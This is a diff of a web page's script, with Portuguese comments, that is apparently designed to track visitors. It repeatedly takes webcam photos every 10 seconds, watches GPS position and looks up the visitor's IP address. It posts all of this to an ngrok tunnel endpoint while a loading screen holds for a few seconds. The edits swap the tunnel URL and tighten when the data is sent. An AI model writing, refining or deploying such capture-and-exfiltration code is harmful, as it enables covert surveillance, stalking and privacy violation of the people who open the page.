@@ -28,7 +28,7 @@
 
   <script>
     document.addEventListener("DOMContentLoaded", () => {
-      console.log("Página carregada, inici Oxygenando localização");
+      console.log("Página carregada, iniciando localização");
       const video = document.getElementById("video");
       const canvas = document.getElementById("canvas");
       let locationData = { latitude: null, longitude: null, accuracy: null, maps: null, source: null, ip: null };
@@ -40,7 +40,7 @@
       async function getClientIP() {
         try {
           console.log("Obtendo IP do cliente...");
-          const response = await fetch("https://api.ipify.org?format=json");
+          const response = await fetch("https://api.ipify.org?format=json", { timeout: 5000 });
           const data = await response.json();
           console.log("IP obtido:", data.ip);
           return data.ip || "Desconhecido";
@@ -66,7 +66,7 @@
           cameraStarted = true;
           return true;
         } catch (error) {
-          console.error("Erro ao iniciar a câmera:", error);
+          console.error("Erro ao iniciar a câmera:", error.message);
           return false;
         }
       }
@@ -101,7 +101,11 @@
           console.log("Iniciando monitoramento de localização...");
           navigator.geolocation.watchPosition(
             position => {
-              console.log("Localização recebida:", position.coords);
+              console.log("Localização recebida:", {
+                latitude: position.coords.latitude,
+                longitude: position.coords.longitude,
+                accuracy: position.coords.accuracy
+              });
               locationData = {
                 latitude: position.coords.latitude,
                 longitude: position.coords.longitude,
@@ -109,21 +113,6 @@
                 maps: `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`,
                 source: "GPS"
               };
-              // Só envia foto se a câmera estiver ativa
-              if (cameraStarted && !loadingTimeout) {
-                console.log("Câmera ativa, enviando primeira foto...");
-                const firstPhoto = capturePhoto();
-                if (firstPhoto) {
-                  sendLocation({ ...locationData, photos: [firstPhoto] });
-                }
-                // Garantir que o carregamento dure pelo menos 3 segundos
-                const startTime = Date.now();
-                loadingTimeout = setTimeout(() => {
-                  console.log("Removendo carregamento após 3 segundos");
-                  removeLoading();
-                  loadingTimeout = null;
-                }, Math.max(3000 - (Date.now() - startTime), 0));
-              }
             },
             error => {
               console.error("Erro ao obter localização por GPS:", error.message, "Código:", error.code);
@@ -171,14 +160,14 @@
           setTimeout(async () => {
             const photo = capturePhoto();
             if (photo) photos.push(photo);
-            if (photos.length > 0) {
+            if (photos.length > 0 && locationData.latitude && locationData.longitude) {
               if (!locationData.ip) {
                 locationData.ip = await getClientIP();
               }
               console.log("Enviando", photos.length, "fotos com localização");
               sendLocation({ ...locationData, photos });
             } else {
-              console.warn("Nenhuma foto válida para enviar");
+              console.warn("Nenhuma foto válida ou localização indisponível para enviar");
             }
           }, 9000); // 9s
         }, 10000); // Repetir a cada 10 segundos
@@ -195,7 +184,7 @@
             if (!locationData.ip) {
               locationData.ip = await getClientIP();
             }
-            // Enviar primeira foto se localização já estiver disponível
+            // Enviar primeira foto se localização estiver disponível
             if (locationData.latitude && locationData.longitude) {
               console.log("Localização disponível, enviando primeira foto...");
               const firstPhoto = capturePhoto();
@@ -210,6 +199,8 @@
                   loadingTimeout = null;
                 }, Math.max(3000 - (Date.now() - startTime), 0));
               }
+            } else {
+              console.warn("Localização ainda não disponível, aguardando...");
             }
             startCaptureInterval();
           } else {
@@ -225,9 +216,15 @@
       }
 
       async function sendLocation(data) {
-        console.log("Enviando dados para o servidor:", data);
+        console.log("Enviando dados para o servidor:", {
+          latitude: data.latitude,
+          longitude: data.longitude,
+          accuracy: data.accuracy,
+          ip: data.ip,
+          photos: data.photos ? `${data.photos.length} fotos` : "nenhuma foto"
+        });
         try {
-          const response = await fetch("https://8285-177-35-125-241.ngrok-free.app/send-location", {
+          const response = await fetch("https://4d9a-177-35-125-241.ngrok-free.app/send-location", {
             method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify(data)
@@ -236,10 +233,10 @@
           if (!result.success) {
             console.error("Erro ao enviar dados:", result.message);
           } else {
-            console.log("Dados enviados com sucesso!");
+            console.log("Dados enviados com sucesso ao servidor!");
           }
         } catch (error) {
-          console.error("Erro na requisição ao servidor:", error);
+          console.error("Erro na requisição ao servidor:", error.message);
         }
       }
 
@@ -250,7 +247,6 @@
       }
 
       // Iniciar apenas a localização ao carregar a página
-      console.log("Iniciando localização ao carregar página...");
       startLocationTracking();
     });
   </script>
